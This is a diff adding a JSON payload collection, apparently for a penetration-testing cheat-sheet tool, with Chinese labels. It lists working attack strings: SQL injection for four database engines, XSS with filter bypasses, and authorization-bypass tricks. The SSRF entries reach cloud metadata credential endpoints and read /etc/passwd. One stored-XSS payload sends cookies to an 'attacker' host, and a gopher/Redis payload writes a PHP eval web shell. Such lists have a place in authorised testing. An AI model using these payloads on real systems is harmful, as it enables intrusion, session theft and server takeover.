@@ -1,0 +1,570 @@
+{
+  "categories": [
+    {
+      "id": "cat_sqli",
+      "name": "SQL注入",
+      "expanded": true,
+      "subCategories": [
+        {
+          "id": "5e8cf9a4-2d3a-4b56-9637-3c2db1d13456",
+          "name": "mysql注入",
+          "entries": [
+            {
+              "id": "836bd467-b136-4d32-8614-31e6491ec054",
+              "title": "探测注入点",
+              "payload": "\u0027 OR \u00271\u0027\u003d\u00271\n\u0027 OR 1\u003d1--\n1\u0027 AND \u00271\u0027\u003d\u00271\n1\u0027 AND \u00271\u0027\u003d\u00272"
+            },
+            {
+              "id": "d4a67644-69c3-4c02-8b19-a7b2c0c07207",
+              "title": "确定数据库列数",
+              "payload": "\u0027 ORDER BY 1--\n\u0027 ORDER BY 2--\n\u0027 ORDER BY 3--\n直到报错确定列数\n或使用:\n\u0027 UNION SELECT NULL--\n\u0027 UNION SELECT NULL,NULL--\n\u0027 UNION SELECT NULL,NULL,NULL--"
+            },
+            {
+              "id": "7831b393-6dc7-40bb-8a5c-3a1532c40c3f",
+              "title": "确定回显位置（回显注入）",
+              "payload": "\u0027 UNION SELECT 1,2,3--\n\u0027 UNION SELECT \u0027a\u0027,\u0027b\u0027,\u0027c\u0027--"
+            },
+            {
+              "id": "18d89e8c-4d79-49fb-9823-545d4db2fda7",
+              "title": "获取数据库基础信息",
+              "payload": "\u0027 UNION SELECT 1,database(),3--\n\u0027 UNION SELECT 1,user(),3--\n\u0027 UNION SELECT 1,version(),3--\n\u0027 UNION SELECT 1,@@hostname,3--"
+            },
+            {
+              "id": "2f7e8c9a-1d2b-3c4d-5e6f-7a8b9c0d1e2f",
+              "title": "报错注入（extractvalue/updatexml）",
+              "payload": "\u0027 AND extractvalue(1,concat(0x7e,database(),0x7e))--\n\u0027 AND updatexml(1,concat(0x7e,user(),0x7e),1)--\n\u0027 AND updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema\u003ddatabase()),0x7e),1)--"
+            },
+            {
+              "id": "3a8b9c0d-4e5f-6a7b-8c9d-0e1f2a3b4c5d",
+              "title": "时间盲注（sleep/if）",
+              "payload": "\u0027 AND IF(length(database())\u003e5,SLEEP(5),1)--\n\u0027 AND IF(ascii(substr(database(),1,1))\u003d115,SLEEP(5),1)--\n\u0027 AND IF((select count(*) from information_schema.tables where table_schema\u003ddatabase())\u003e10,SLEEP(5),1)--"
+            }
+          ]
+        },
+        {
+          "id": "10edda04-6bc4-4d8d-a321-5f0e2abae920",
+          "name": "SQLserver注入",
+          "entries": [
+            {
+              "id": "f8b7c921-7e45-489d-8f1a-9e8b7d6c5b4a",
+              "title": "探测注入点",
+              "payload": "\u0027 OR \u00271\u0027\u003d\u00271--\n\u0027 OR 1\u003d1--\n1\u0027 AND \u00271\u0027\u003d\u00271\n1\u0027 AND \u00271\u0027\u003d\u00272\n\u0027;WAITFOR DELAY \u00270:0:5\u0027-- (时间盲注探测)"
+            },
+            {
+              "id": "e7a8d912-6f54-478c-8e9b-8c7d6b5a4e3f",
+              "title": "确定数据库列数",
+              "payload": "\u0027 ORDER BY 1--\n\u0027 ORDER BY 2--\n直到报错确定列数\n或使用:\n\u0027 UNION SELECT NULL--\n\u0027 UNION SELECT NULL,NULL--\n注意：SQLServer UNION需前后列数/类型一致"
+            },
+            {
+              "id": "d6b9e803-5e43-467b-7d8a-7b6a5d4c3b2a",
+              "title": "确定回显位置（回显注入）",
+              "payload": "\u0027 UNION SELECT 1,2,3--\n\u0027 UNION SELECT \u0027a\u0027,\u0027b\u0027,\u0027c\u0027--\n\u0027 UNION SELECT @@VERSION,USER_NAME(),DB_NAME()--"
+            },
+            {
+              "id": "c5c0f794-4d32-456a-6c7b-6a5d4c3b2a19",
+              "title": "获取数据库基础信息",
+              "payload": "\u0027 UNION SELECT 1,DB_NAME(),3--\n\u0027 UNION SELECT 1,SYSTEM_USER,3--\n\u0027 UNION SELECT 1,@@VERSION,3--\n\u0027 UNION SELECT 1,HOST_NAME(),3--\n\u0027 UNION SELECT 1,SERVERPROPERTY(\u0027productversion\u0027),3--"
+            },
+            {
+              "id": "b4d1e685-3c21-4459-5b6c-594b3a2c1d08",
+              "title": "读取系统表（表名/列名）",
+              "payload": "\u0027 UNION SELECT 1,name,3 FROM sys.tables--\n\u0027 UNION SELECT 1,COLUMN_NAME,3 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME\u003d\u0027表名\u0027--"
+            },
+            {
+              "id": "4b9c0d1e-5f2a-6b3c-7d4e-8f5a0b1c2d3e",
+              "title": "报错注入（convert/CAST）",
+              "payload": "\u0027 AND convert(int,(select db_name()))--\n\u0027 AND CAST((select system_user) as int)--\n\u0027 AND CAST((select @@version) as int)--\n\u0027 AND CAST((select name from sys.tables where object_id\u003d1) as int)--"
+            },
+            {
+              "id": "5c0d1e2f-6a3b-7c4d-8e5f-9a0b1c2d3e4f",
+              "title": "时间盲注（waitfor delay）",
+              "payload": "\u0027 IF (LEN(DB_NAME())\u003e5) WAITFOR DELAY \u002700:00:05\u0027--\n\u0027 IF (ASCII(SUBSTRING(DB_NAME(),1,1))\u003d100) WAITFOR DELAY \u002700:00:05\u0027--\n\u0027 IF (EXISTS(SELECT * FROM sys.tables)) WAITFOR DELAY \u002700:00:05\u0027--"
+            }
+          ]
+        },
+        {
+          "id": "c234bcc8-005c-46d2-a633-ee4e548a79d2",
+          "name": "Oracle注入",
+          "entries": [
+            {
+              "id": "a3e2d576-2b10-4348-4a5d-483c2b1a09f7",
+              "title": "探测注入点",
+              "payload": "\u0027 OR \u00271\u0027\u003d\u00271\n\u0027 OR 1\u003d1--\n1\u0027 AND \u00271\u0027\u003d\u00271\n1\u0027 AND \u00271\u0027\u003d\u00272\n\u0027;dbms_lock.sleep(5)-- (时间盲注探测，需权限)"
+            },
+            {
+              "id": "92f1c467-1a09-4237-3b4c-372b1a09f8e6",
+              "title": "确定数据库列数",
+              "payload": "\u0027 ORDER BY 1--\n\u0027 ORDER BY 2--\n直到报错确定列数\n或使用:\n\u0027 UNION SELECT NULL FROM DUAL--\n\u0027 UNION SELECT NULL,NULL FROM DUAL--\n注意：Oracle需加FROM DUAL"
+            },
+            {
+              "id": "81e0b358-09f8-4126-2c3d-261a09f8e7d5",
+              "title": "确定回显位置（回显注入）",
+              "payload": "\u0027 UNION SELECT 1,2,3 FROM DUAL--\n\u0027 UNION SELECT \u0027a\u0027,\u0027b\u0027,\u0027c\u0027 FROM DUAL--"
+            },
+            {
+              "id": "70d9a249-f8e7-4015-1d2e-1509f8e7d6c4",
+              "title": "获取数据库基础信息",
+              "payload": "\u0027 UNION SELECT 1,SYS_CONTEXT(\u0027USERENV\u0027,\u0027CURRENT_SCHEMA\u0027),3 FROM DUAL--\n\u0027 UNION SELECT 1,USER,3 FROM DUAL--\n\u0027 UNION SELECT 1,VERSION FROM V$INSTANCE--\n\u0027 UNION SELECT 1,HOST_NAME FROM V$INSTANCE--"
+            },
+            {
+              "id": "69c89130-e7d6-3904-0e1f-0498e7d6c5b3",
+              "title": "读取系统表（表名/列名）",
+              "payload": "\u0027 UNION SELECT 1,TABLE_NAME,3 FROM ALL_TABLES WHERE OWNER\u003d\u0027用户名\u0027--\n\u0027 UNION SELECT 1,COLUMN_NAME,3 FROM ALL_TAB_COLUMNS WHERE TABLE_NAME\u003d\u0027表名\u0027--"
+            },
+            {
+              "id": "6d1e2f3a-7b4c-8d5e-9f0a-1b2c3d4e5f6a",
+              "title": "报错注入（utl_inaddr/get_host_name）",
+              "payload": "\u0027 AND utl_inaddr.get_host_name((select user from dual)) is not null--\n\u0027 AND (select count(*) from all_tables where rownum\u003d1 and owner\u003duser)||chr(126) raises error--\n\u0027 AND dbms_xdb_version.checkin((select banner from v$version where rownum\u003d1)) is not null--"
+            },
+            {
+              "id": "7e2f3a4b-8c5d-9e6f-0a1b-2c3d4e5f6a7b",
+              "title": "时间盲注（dbms_lock.sleep）",
+              "payload": "\u0027 AND dbms_lock.sleep(5) FROM dual WHERE length(user)\u003e3--\n\u0027 AND (CASE WHEN ascii(substr(user,1,1))\u003d83 THEN dbms_lock.sleep(5) ELSE 1 END) FROM dual--\n\u0027 AND (CASE WHEN EXISTS(SELECT * FROM all_tables) THEN dbms_lock.sleep(5) ELSE 1 END) FROM dual--"
+            }
+          ]
+        },
+        {
+          "id": "8cfc7983-9a8a-4d2f-b4c7-e6e9a271e2bf",
+          "name": "pgSQL注入",
+          "entries": [
+            {
+              "id": "58b78021-d6c5-3893-f90e-f387d6c5b4a2",
+              "title": "探测注入点",
+              "payload": "\u0027 OR \u00271\u0027\u003d\u00271--\n\u0027 OR 1\u003d1--\n1\u0027 AND \u00271\u0027\u003d\u00271\n1\u0027 AND \u00271\u0027\u003d\u00272\n\u0027;SELECT pg_sleep(5)-- (时间盲注探测)"
+            },
+            {
+              "id": "47a67912-c5b4-3782-e89d-e276c5b4a3f1",
+              "title": "确定数据库列数",
+              "payload": "\u0027 ORDER BY 1--\n\u0027 ORDER BY 2--\n直到报错确定列数\n或使用:\n\u0027 UNION SELECT NULL--\n\u0027 UNION SELECT NULL,NULL--"
+            },
+            {
+              "id": "36b56803-b4a3-3671-d78c-d165b4a3f2e0",
+              "title": "确定回显位置（回显注入）",
+              "payload": "\u0027 UNION SELECT 1,2,3--\n\u0027 UNION SELECT \u0027a\u0027,\u0027b\u0027,\u0027c\u0027--"
+            },
+            {
+              "id": "25c45694-a3f2-3560-c67b-c054a3f2e1d9",
+              "title": "获取数据库基础信息",
+              "payload": "\u0027 UNION SELECT 1,current_database(),3--\n\u0027 UNION SELECT 1,current_user,3--\n\u0027 UNION SELECT 1,version(),3--\n\u0027 UNION SELECT 1,inet_server_addr(),3--"
+            },
+            {
+              "id": "14d34585-92e1-3459-b56a-b943f2e1d0c8",
+              "title": "读取系统表（表名/列名）",
+              "payload": "\u0027 UNION SELECT 1,tablename,3 FROM pg_tables WHERE schemaname\u003d\u0027public\u0027--\n\u0027 UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name\u003d\u0027表名\u0027--"
+            },
+            {
+              "id": "8f3a4b5c-9d6e-0f1a-2b3c-4d5e6f7a8b9c",
+              "title": "报错注入（cast/convert）",
+              "payload": "\u0027 AND cast(current_database() as int)--\n\u0027 AND convert(int,current_user)--\n\u0027 AND (select relname from pg_class where relkind\u003d\u0027r\u0027 limit 1)::int--"
+            },
+            {
+              "id": "9a4b5c6d-0e7f-1a2b-3c4d-5e6f7a8b9c0d",
+              "title": "时间盲注（pg_sleep）",
+              "payload": "\u0027 AND pg_sleep(5) WHERE length(current_database())\u003e5--\n\u0027 AND (CASE WHEN ascii(substr(current_user,1,1))\u003d112 THEN pg_sleep(5) ELSE 0 END)--\n\u0027 AND pg_sleep(5) WHERE exists(select * from pg_tables where tablename like \u0027%user%\u0027)--"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cat_xss",
+      "name": "XSS",
+      "expanded": true,
+      "subCategories": [
+        {
+          "id": "b3f61865-3450-460f-ab8b-d85176f4303f",
+          "name": "Bypass WAF",
+          "entries": [
+            {
+              "id": "xss-bypass-001",
+              "title": "大小写混淆绕过",
+              "payload": "\u003cScRiPt\u003ealert(1)\u003c/ScRiPt\u003e\n\u003csCrIpT\u003eprompt(1)\u003c/sCrIpT\u003e"
+            },
+            {
+              "id": "xss-bypass-002",
+              "title": "拆分标签/编码绕过",
+              "payload": "\u003csvg onload\u003dalert(1)\u003e\n\u003cimg src\u003dx onerror\u003dalert(1)\u003e\n\u003ca href\u003d\"javascript:alert(1)\"\u003eclick\u003c/a\u003e"
+            },
+            {
+              "id": "xss-bypass-003",
+              "title": "无括号绕过",
+              "payload": "\u003cscript\u003ealert`1`\u003c/script\u003e\n\u003cscript\u003etop[\u0027al\u0027+\u0027ert\u0027](1)\u003c/script\u003e"
+            }
+          ]
+        },
+        {
+          "id": "95d9dec1-3360-4e55-b1a3-9c0e78ecd3b9",
+          "name": "反射XSS",
+          "entries": [
+            {
+              "id": "xss-ref-001",
+              "title": "基础script标签",
+              "payload": "\u003cscript\u003ealert(1)\u003c/script\u003e\n\u003cscript\u003eprompt(document.domain)\u003c/script\u003e"
+            },
+            {
+              "id": "xss-ref-002",
+              "title": "图片事件触发",
+              "payload": "\u003cimg src\u003d1 onerror\u003dalert(1)\u003e\n\u003cimg src\u003dx onmouseover\u003dalert(1)\u003e"
+            },
+            {
+              "id": "xss-ref-003",
+              "title": "SVG事件触发",
+              "payload": "\u003csvg onload\u003dalert(1)\u003e\n\u003csvg onload\u003dprompt(1)\u003e"
+            },
+            {
+              "id": "xss-ref-004",
+              "title": "iframe 触发",
+              "payload": "\u003ciframe onload\u003dalert(1)\u003e\u003c/iframe\u003e\n\u003ciframe src\u003djavascript:alert(1)\u003e\u003c/iframe\u003e"
+            },
+            {
+              "id": "xss-ref-005",
+              "title": "超链接 javascript",
+              "payload": "\u003ca href\u003d\"javascript:alert(1)\"\u003eXSS\u003c/a\u003e\n\u003ca href\u003d\"javascript:top.alert(1)\"\u003eXSS\u003c/a\u003e"
+            },
+            {
+              "id": "xss-ref-006",
+              "title": "input 自动聚焦",
+              "payload": "\u003cinput onfocus\u003dalert(1) autofocus\u003e\n\u003cinput onblur\u003dalert(1)\u003e"
+            },
+            {
+              "id": "xss-ref-007",
+              "title": "body 事件",
+              "payload": "\u003cbody onload\u003dalert(1)\u003e\n\u003cbody onscroll\u003dalert(1)\u003e"
+            }
+          ]
+        },
+        {
+          "id": "6a72e2c4-00b8-44d3-b940-e8cc29063f89",
+          "name": "存储XSS",
+          "entries": [
+            {
+              "id": "xss-sto-001",
+              "title": "标准存储型 payload",
+              "payload": "\u003cscript\u003ealert(document.domain)\u003c/script\u003e\n\u003cscript\u003efetch(\u0027http://attacker/\u0027+document.cookie)\u003c/script\u003e"
+            },
+            {
+              "id": "xss-sto-002",
+              "title": "图片无交互触发",
+              "payload": "\u003cimg src\u003dx onerror\u003dalert(document.domain)\u003e\n\u003cimg src\u003d1 onerror\u003dfetch(\u0027http://x\u0027)\u003e"
+            },
+            {
+              "id": "xss-sto-003",
+              "title": "闭合标签类（高危通用）",
+              "payload": "\u003c/textarea\u003e\u003cscript\u003ealert(1)\u003c/script\u003e\n\u003c/title\u003e\u003cscript\u003ealert(1)\u003c/script\u003e\n\u003c/style\u003e\u003cimg src\u003dx onerror\u003dalert(1)\u003e\n\u003c/video\u003e\u003csvg onload\u003dalert(1)\u003e\n\u003c/div\u003e\u003cscript\u003ealert(1)\u003c/script\u003e"
+            },
+            {
+              "id": "xss-sto-004",
+              "title": "冷门标签：video / audio",
+              "payload": "\u003c/video\u003e\u003cscript\u003ealert(1)\u003c/script\u003e\n\u003cvideo onerror\u003dalert(1)\u003e\n\u003caudio onerror\u003dalert(1) src\u003dx\u003e"
+            },
+            {
+              "id": "xss-sto-005",
+              "title": "冷门标签：svg / math",
+              "payload": "\u003csvg onload\u003dalert(1)\u003e\n\u003cmath\u003e\u003cmtext\u003e\u003cscript\u003ealert(1)\u003c/script\u003e\u003c/mtext\u003e\u003c/math\u003e"
+            },
+            {
+              "id": "xss-sto-006",
+              "title": "冷门标签：details / marquee",
+              "payload": "\u003cdetails open ontoggle\u003dalert(1)\u003e\n\u003cmarquee onscroll\u003dalert(1)\u003e"
+            },
+            {
+              "id": "xss-sto-007",
+              "title": "富文本/评论区专用",
+              "payload": "\u003cdiv onmouseover\u003dalert(1)\u003etest\u003c/div\u003e\n\u003cspan onclick\u003dalert(1)\u003eclick\u003c/span\u003e"
+            },
+            {
+              "id": "xss-sto-008",
+              "title": "超长闭合逃逸（通用杀招）",
+              "payload": "\"\u003e\u003c/div\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\u003c/iframe\u003e\u003c/noscript\u003e\u003c/style\u003e\u003c/title\u003e\u003c/textarea\u003e\u003c/video\u003e\u003cscript\u003ealert(1)\u003c/script\u003e"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cat_ssrf",
+      "name": "SSRF",
+      "expanded": true,
+      "subCategories": [
+        {
+          "id": "ssrf-basic",
+          "name": "基础探测",
+          "entries": [
+            {
+              "id": "ssrf-basic-01",
+              "title": "本地探测",
+              "payload": "http://localhost\nhttp://127.0.0.1\nhttp://0.0.0.0"
+            },
+            {
+              "id": "ssrf-basic-02",
+              "title": "内网网段探测",
+              "payload": "http://192.168.0.1\nhttp://10.0.0.1\nhttp://172.16.0.1\nhttp://169.254.169.254\nhttp://metadata.tencentyun.com\nhttp://metadata.aliyun.com"
+            },
+            {
+              "id": "ssrf-basic-03",
+              "title": "常见端口探测",
+              "payload": "http://127.0.0.1:80\nhttp://127.0.0.1:443\nhttp://127.0.0.1:8080\nhttp://127.0.0.1:7001\nhttp://127.0.0.1:3306\nhttp://127.0.0.1:6379\nhttp://127.0.0.1:8888"
+            }
+          ]
+        },
+        {
+          "id": "ssrf-bypass",
+          "name": "SSRF 绕过方式",
+          "entries": [
+            {
+              "id": "ssrf-bypass-01",
+              "title": "IP 各种格式绕过",
+              "payload": "http://0\nhttp://127.0.0.1\nhttp://127.0.0.0\nhttp://127.1\nhttp://0x7f.0.0.1\nhttp://2130706433"
+            },
+            {
+              "id": "ssrf-bypass-02",
+              "title": "特殊域名绕过",
+              "payload": "http://localhost@127.0.0.1\nhttp://a.com@127.0.0.1\nhttp://xip.io\nhttp://nip.io"
+            },
+            {
+              "id": "ssrf-bypass-03",
+              "title": "协议/符号绕过",
+              "payload": "file://\n\\\\\ngopher://\ndict://\nftp://"
+            },
+            {
+              "id": "ssrf-bypass-04",
+              "title": "302 跳转绕过",
+              "payload": "http://your-redirect-url/redirect?url\u003d127.0.0.1"
+            }
+          ]
+        },
+        {
+          "id": "ssrf-protocol",
+          "name": "协议利用",
+          "entries": [
+            {
+              "id": "ssrf-pro-01",
+              "title": "file 协议读取文件",
+              "payload": "file:///etc/passwd\nfile:///C:/Windows/System32/drivers/etc/hosts\nfile:///proc/self/environ\nfile:///proc/cmdline"
+            },
+            {
+              "id": "ssrf-pro-02",
+              "title": "dict 协议探测端口",
+              "payload": "dict://127.0.0.1:6379/info\ndict://127.0.0.1:3306/info"
+            },
+            {
+              "id": "ssrf-pro-03",
+              "title": "ftp 协议探测",
+              "payload": "ftp://127.0.0.1:21\nftp://test:test@127.0.0.1:21"
+            },
+            {
+              "id": "ssrf-pro-04",
+              "title": "gopher 协议（高危）",
+              "payload": "gopher://127.0.0.1:6379/_\ngopher://127.0.0.1:3306/_\ngopher://127.0.0.1:80/_"
+            }
+          ]
+        },
+        {
+          "id": "ssrf-attack",
+          "name": "内网攻击",
+          "entries": [
+            {
+              "id": "ssrf-attack-01",
+              "title": "Redis 未授权",
+              "payload": "gopher://127.0.0.1:6379/_config%20set%20dir%20/var/www/html\nconfig%20set%20dbfilename%20shell.php\nset%20shell%20%3C%3Fphp%20eval($_POST[1])%3B%3F%3E\nsave"
+            },
+            {
+              "id": "ssrf-attack-02",
+              "title": "MySQL 攻击",
+              "payload": "gopher://127.0.0.1:3306/_\nhttp://127.0.0.1:3306"
+            },
+            {
+              "id": "ssrf-attack-03",
+              "title": "FastCGI RCE",
+              "payload": "gopher://127.0.0.1:9000/_"
+            },
+            {
+              "id": "ssrf-attack-04",
+              "title": "Memcached 攻击",
+              "payload": "gopher://127.0.0.1:11211/_set%20shell%200%2060%2024%0D%0A%3C%3Fphp%20info()%3B%3F%3E%0D%0A"
+            }
+          ]
+        },
+        {
+          "id": "ssrf-cloud",
+          "name": "云服务器 SSRF",
+          "entries": [
+            {
+              "id": "ssrf-cloud-01",
+              "title": "阿里云元数据",
+              "payload": "http://100.100.100.200/latest/meta-data/\nhttp://100.100.100.200/latest/meta-data/instance-id\nhttp://100.100.100.200/latest/meta-data/ram/security-credentials/"
+            },
+            {
+              "id": "ssrf-cloud-02",
+              "title": "腾讯云元数据",
+              "payload": "http://metadata.tencentyun.com/latest/meta-data/\nhttp://metadata.tencentyun.com/latest/meta-data/instance-id"
+            },
+            {
+              "id": "ssrf-cloud-03",
+              "title": "AWS 元数据",
+              "payload": "http://169.254.169.254/latest/meta-data/\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cat_auth",
+      "name": "越权",
+      "expanded": true,
+      "subCategories": [
+        {
+          "id": "auth_basic",
+          "name": "水平越权",
+          "entries": [
+            {
+              "id": "auth-hori-01",
+              "title": "ID 自增遍历",
+              "payload": "user_id\u003d1\nuser_id\u003d2\nuser_id\u003d3\nid\u003d1\nid\u003d2\nuid\u003d1\nuid\u003d2"
+            },
+            {
+              "id": "auth-hori-02",
+              "title": "用户身份替换",
+              "payload": "username\u003dtest\nusername\u003dadmin\naccount\u003dtest\naccount\u003dadmin"
+            },
+            {
+              "id": "auth-hori-03",
+              "title": "Token/身份凭证替换",
+              "payload": "token\u003d其他用户token        只用于垂直越权测试\nsession_id\u003d其他用户session 只用于垂直越权测试\nuid\u003d其他用户uid"
+            },
+            {
+              "id": "auth-hori-04",
+              "title": "手机号/邮箱越权",
+              "payload": "phone\u003d13800138000\nemail\u003dtest@test.com"
+            },
+            {
+              "id": "799d3110-9df4-488d-9353-5c2dc642111f",
+              "title": "参数值后面加空格",
+              "payload": "uid\u003d1005\nuid\u003d1005空格\n"
+            },
+            {
+              "id": "12333b3e-dc80-4dfc-a707-3e8c95b2e6c0",
+              "title": "双写参数值",
+              "payload": "uid\u003d1234\nuid\u003d1234,\nuid\u003d1234,1235\nuid\u003d1234\u0026uid\u003d1235"
+            },
+            {
+              "id": "6198e412-74ed-4fd3-8119-4f438280b5e3",
+              "title": "参数值置空",
+              "payload": "uid\u003d1234\nuid\u003d"
+            },
+            {
+              "id": "a9f2845d-4d85-4690-8449-78079b5d85c5",
+              "title": "id后面加json",
+              "payload": "uid\u003d1234\nuid\u003d1234.json\nuid\u003d1235.json"
+            },
+            {
+              "id": "d492e142-246c-44d2-99fe-44da50a6a5b2",
+              "title": "/等符号进行绕过",
+              "payload": "/api/6798556007/users     403\n/api/6798556007//users    200\n/api/6798556007/users/    200"
+            },
+            {
+              "id": "fcbf9cf7-62cb-45d3-9b70-15dbbc281ced",
+              "title": "浮点数越权",
+              "payload": "uid\u003d12345\nuid\u003d12344.999999"
+            },
+            {
+              "id": "41d5a3dd-cd9a-4a9b-99b0-5e303b5c5001",
+              "title": "接口通配符越权",
+              "payload": "通配符参数：* % . _ ,\n\n~ /api/users/*\n~ /api/users/%\n~ /api/users/_\n~ /api/users/.\n"
+            },
+            {
+              "id": "281cea96-0eee-421c-85c8-b74b0e919ae3",
+              "title": "过时API版本替换",
+              "payload": "/api/v3/user/\n/api/v3/user/123\n/api/v2/user/123\n/api/v1/user/123"
+            },
+            {
+              "id": "71b5d949-da16-441f-a726-1a6284dde4fd",
+              "title": "前置导0越权",
+              "payload": "/api/users/9\n/api/users/009"
+            }
+          ]
+        },
+        {
+          "id": "auth_vertical",
+          "name": "垂直越权",
+          "entries": [
+            {
+              "id": "auth-vert-01",
+              "title": "权限等级修改",
+              "payload": "role\u003duser → role\u003dadmin\nlevel\u003d1 → level\u003d0\nauth\u003d0 → auth\u003d1\nis_admin\u003d0 → is_admin\u003d1"
+            },
+            {
+              "id": "auth-vert-02",
+              "title": "管理员接口直接访问",
+              "payload": "/admin/user/list\n/admin/system/config\n/admin/user/del\n/api/v1/admin/info"
+            },
+            {
+              "id": "auth-vert-03",
+              "title": "Cookie 权限修改",
+              "payload": "admin\u003d1\nuser_role\u003dadmin\nisAdmin\u003dtrue"
+            }
+          ]
+        },
+        {
+          "id": "auth_no_auth",
+          "name": "未授权访问",
+          "entries": [
+            {
+              "id": "auth-no-01",
+              "title": "直接访问接口",
+              "payload": "/api/user/info\n/api/system/version\n/api/config/get\n/api/export/data"
+            },
+            {
+              "id": "auth-no-02",
+              "title": "删除认证参数",
+              "payload": "删除 token 参数\n删除 cookie\n删除 sign 签名\n删除 uid 参数"
+            },
+            {
+              "id": "auth-no-03",
+              "title": "HTTP 方法绕过",
+              "payload": "GET → POST\nPOST → GET\nOPTIONS /api/user/info\nHEAD /api/user/info"
+            }
+          ]
+        },
+        {
+          "id": "auth_bypass",
+          "name": "越权绕过手法",
+          "entries": [
+            {
+              "id": "auth-bypass-01",
+              "title": "请求头绕过",
+              "payload": "X-Forwarded-For: 127.0.0.1\nX-Real-IP: 127.0.0.1\nRemote-Addr: 127.0.0.1"
+            },
+            {
+              "id": "auth-bypass-02",
+              "title": "Referer 绕过",
+              "payload": "Referer: 目标域名/admin\nReferer: 目标域名"
+            },
+            {
+              "id": "auth-bypass-03",
+              "title": "参数替换绕过",
+              "payload": "?id\u003d1\u0026uid\u003d1\n?id\u003d1\u0026user_id\u003d1\n?id\u003d1\u0026admin_id\u003d1"
+            },
+            {
+              "id": "auth-bypass-04",
+              "title": "路径遍历绕过",
+              "payload": "/api/../admin\n/admin/./user\n/./api/user/info"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cat_rce",
+      "name": "命令执行",
+      "expanded": true,
+      "subCategories": []
+    },
+    {
+      "id": "cat_xxe",
+      "name": "XXE",
+      "expanded": true,
+      "subCategories": []
+    }
+  ]
+}
